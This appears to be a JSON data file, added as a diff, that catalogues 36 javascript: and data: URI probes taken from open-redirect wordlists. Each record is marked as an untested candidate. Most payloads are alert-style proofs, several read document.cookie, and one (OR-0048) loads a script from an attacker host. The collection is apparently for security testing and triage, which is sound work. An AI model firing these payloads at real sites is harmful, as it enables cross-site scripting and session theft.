@@ -1,0 +1,831 @@
+{
+  "name": "client_side_navigation_probes",
+  "record_type": "client_side_navigation_probe",
+  "count": 36,
+  "note": "Classification only; records remain untested unless explicitly documented otherwise.",
+  "records": [
+    {
+      "id": "OR-0044",
+      "payload": "javascript:alert(1)",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist",
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0045",
+      "payload": "javascript:alert('XSS')",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "javascript:alert('XSS')",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:alert('XSS')",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0046",
+      "payload": "javascript://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "javascript://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript://{{ATTACKER_HOST}}",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0047",
+      "payload": "javascript://evil.com%0Aalert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "javascript://{{ATTACKER_HOST}}%0Aalert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript://{{ATTACKER_HOST}}%0Aalert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0048",
+      "payload": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://evil.com\\';document.body.appendChild(a)')",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "backslash_and_slash_confusion",
+        "http_https_scheme_or_absolute_url",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://{{ATTACKER_HOST}}\\';document.body.appendChild(a)')",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://{{ATTACKER_HOST}}\\';document.body.appendChild(a)')",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0049",
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "data:text/html,<script>alert(1)</script>",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:text/html,<script>alert(1)</script>",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0050",
+      "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0317",
+      "payload": "/redirect?url=javascript:alert(1)",
+      "families": [
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=javascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/redirect?url=javascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0318",
+      "payload": "/redirect?url=javascript:alert('XSS')",
+      "families": [
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=javascript:alert('XSS')",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/redirect?url=javascript:alert('XSS')",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0319",
+      "payload": "/redirect?url=javascript://evil.com%0Aalert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=javascript://{{ATTACKER_HOST}}%0Aalert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/redirect?url=javascript://{{ATTACKER_HOST}}%0Aalert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0320",
+      "payload": "/redirect?url=data:text/html,<script>alert(1)</script>",
+      "families": [
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=data:text/html,<script>alert(1)</script>",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/redirect?url=data:text/html,<script>alert(1)</script>",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0321",
+      "payload": "/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "families": [
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0473",
+      "payload": "/%09/javascript:alert(1);",
+      "families": [
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/%09/javascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/%09/javascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0474",
+      "payload": "/%09/javascript:alert(1)",
+      "families": [
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/%09/javascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/%09/javascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0544",
+      "payload": "//%5cjavascript:alert(1);",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "//%5cjavascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "//%5cjavascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0545",
+      "payload": "//%5cjavascript:alert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "//%5cjavascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "//%5cjavascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0546",
+      "payload": "/%5cjavascript:alert(1);",
+      "families": [
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/%5cjavascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/%5cjavascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0547",
+      "payload": "/%5cjavascript:alert(1)",
+      "families": [
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/%5cjavascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/%5cjavascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0562",
+      "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0563",
+      "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0564",
+      "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0565",
+      "payload": "data:whitelisted.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>",
+      "families": [
+        "other_or_baseline_url_variation"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "data:{{ALLOWED_HOST}};text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "data:{{ALLOWED_HOST}};text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ALLOWED_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0879",
+      "payload": "javascript://%0aalert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript://%0aalert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript://%0aalert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0880",
+      "payload": "<>javascript:alert(1);",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "<>javascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "<>javascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0881",
+      "payload": "//javascript:alert(1);",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "//javascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "//javascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0882",
+      "payload": "//javascript:alert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "//javascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "//javascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0883",
+      "payload": "/javascript:alert(1);",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/javascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/javascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0884",
+      "payload": "/javascript:alert(1)",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/javascript:alert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/javascript:alert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0886",
+      "payload": "javascript:alert(1);",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript:alert(1);",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:alert(1);",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0887",
+      "payload": "javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0888",
+      "payload": "javascript:confirm(1)",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript:confirm(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:confirm(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0889",
+      "payload": "javascript://https://whitelisted.com/?z=%0Aalert(1)",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "http_https_scheme_or_absolute_url",
+        "javascript_or_data_scheme_sink_specific",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript://https://{{ALLOWED_HOST}}/?z=%0Aalert(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript://https://{{ALLOWED_HOST}}/?z=%0Aalert(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ALLOWED_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0890",
+      "payload": "javascript:prompt(1)",
+      "families": [
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript:prompt(1)",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript:prompt(1)",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0891",
+      "payload": "jaVAscript://whitelisted.com//%0d%0aalert(1);//",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "jaVAscript://{{ALLOWED_HOST}}//%0d%0aalert(1);//",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "jaVAscript://{{ALLOWED_HOST}}//%0d%0aalert(1);//",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ALLOWED_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0892",
+      "payload": "javascript://whitelisted.com?%a0alert%281%29",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "javascript://{{ALLOWED_HOST}}?%a0alert%281%29",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "javascript://{{ALLOWED_HOST}}?%a0alert%281%29",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ALLOWED_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0941",
+      "payload": "/x:1/:///%01javascript:alert(document.cookie)/",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "javascript_or_data_scheme_sink_specific"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "/x:1/:///%01javascript:alert(document.cookie)/",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "client_side_navigation_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Non-HTTP(S) scheme / browser navigation sink probe; not a conventional HTTP(S) Open Redirect candidate.",
+      "runtime_value": "/x:1/:///%01javascript:alert(document.cookie)/",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    }
+  ]
+}
